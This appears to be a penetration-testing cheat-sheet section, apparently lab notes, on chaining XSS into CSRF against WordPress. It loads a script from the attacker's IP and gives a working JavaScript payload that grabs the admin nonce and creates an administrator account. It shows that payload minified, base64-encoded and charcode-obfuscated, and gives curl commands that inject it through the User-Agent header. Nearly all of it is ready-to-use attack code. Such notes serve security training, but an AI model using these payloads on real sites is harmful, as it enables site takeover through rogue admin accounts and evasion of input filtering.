## CSRF

### CSRF2LFI

We can leverage discovered XSS to run javascript code shown in the following example:

```js
<script src="http://<OUR_IP>/pwn.js"></script>
```

Follow the logic seen [here](https://www.youtube.com/watch?v=aWXfEDIYZu8&t=1095)

### CSRF2RCE

In this example, our target uses nonce's to prevent CSRF, but we can bypass this by first getting a nonce from an endpoint. We will then create an admin user.

```js
// Grab nonce
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// Create the admin user
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

We can now use [JSCompress](https://jscompress.com/) to ensure it is handled correctly by Burp and the target application.

JSCompress output:

```
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

We can use 2 methods to remove bad characters, allowing us to send the payload

**Base64**

```bash
echo -n 'var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);' | base64 -w 0
```

Now in order to launch our payload, we will use JavaScript's `eval` and `atob` functions to evaluate the base64 as JavaScript code.

```js
<script>eval(atob('dmFyIGFqYXhSZXF1ZXN0PW5ldyBYTUxIdHRwUmVxdWVzdCxyZXF1ZXN0VVJMPSIvd3AtYWRtaW4vdXNlci1uZXcucGhwIixub25jZVJlZ2V4PS9zZXIiIHZhbHVlPSIoW14iXSo/KSIvZzthamF4UmVxdWVzdC5vcGVuKCJHRVQiLHJlcXVlc3RVUkwsITEpLGFqYXhSZXF1ZXN0LnNlbmQoKTt2YXIgbm9uY2VNYXRjaD1ub25jZVJlZ2V4LmV4ZWMoYWpheFJlcXVlc3QucmVzcG9uc2VUZXh0KSxub25jZT1ub25jZU1hdGNoWzFdLHBhcmFtcz0iYWN0aW9uPWNyZWF0ZXVzZXImX3dwbm9uY2VfY3JlYXRlLXVzZXI9Iitub25jZSsiJnVzZXJfbG9naW49YXR0YWNrZXImZW1haWw9YXR0YWNrZXJAb2Zmc2VjLmNvbSZwYXNzMT1hdHRhY2tlcnBhc3MmcGFzczI9YXR0YWNrZXJwYXNzJnJvbGU9YWRtaW5pc3RyYXRvciI7KGFqYXhSZXF1ZXN0PW5ldyBYTUxIdHRwUmVxdWVzdCkub3BlbigiUE9TVCIscmVxdWVzdFVSTCwhMCksYWpheFJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiksYWpheFJlcXVlc3Quc2VuZChwYXJhbXMpOw=='))</script>
```

In this context, we would execute this command with the following curl request:

```bash
curl -i http://offsecwp --user-agent "<script>eval(atob('dmFyIGFqYXhSZXF1ZXN0PW5ldyBYTUxIdHRwUmVxdWVzdCxyZXF1ZXN0VVJMPSIvd3AtYWRtaW4vdXNlci1uZXcucGhwIixub25jZVJlZ2V4PS9zZXIiIHZhbHVlPSIoW14iXSo/KSIvZzthamF4UmVxdWVzdC5vcGVuKCJHRVQiLHJlcXVlc3RVUkwsITEpLGFqYXhSZXF1ZXN0LnNlbmQoKTt2YXIgbm9uY2VNYXRjaD1ub25jZVJlZ2V4LmV4ZWMoYWpheFJlcXVlc3QucmVzcG9uc2VUZXh0KSxub25jZT1ub25jZU1hdGNoWzFdLHBhcmFtcz0iYWN0aW9uPWNyZWF0ZXVzZXImX3dwbm9uY2VfY3JlYXRlLXVzZXI9Iitub25jZSsiJnVzZXJfbG9naW49YXR0YWNrZXImZW1haWw9YXR0YWNrZXJAb2Zmc2VjLmNvbSZwYXNzMT1hdHRhY2tlcnBhc3MmcGFzczI9YXR0YWNrZXJwYXNzJnJvbGU9YWRtaW5pc3RyYXRvciI7KGFqYXhSZXF1ZXN0PW5ldyBYTUxIdHRwUmVxdWVzdCkub3BlbigiUE9TVCIscmVxdWVzdFVSTCwhMCksYWpheFJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiksYWpheFJlcXVlc3Quc2VuZChwYXJhbXMpOw'))</script>"
```

This actually didnt work in this example, but I suspect this is due to strange backend restrictions.

**CharCode**

We will execute the following function in our browser, replacing `insert_minified_javascript`.

```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

We can now execute the following command in this context

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>"
```

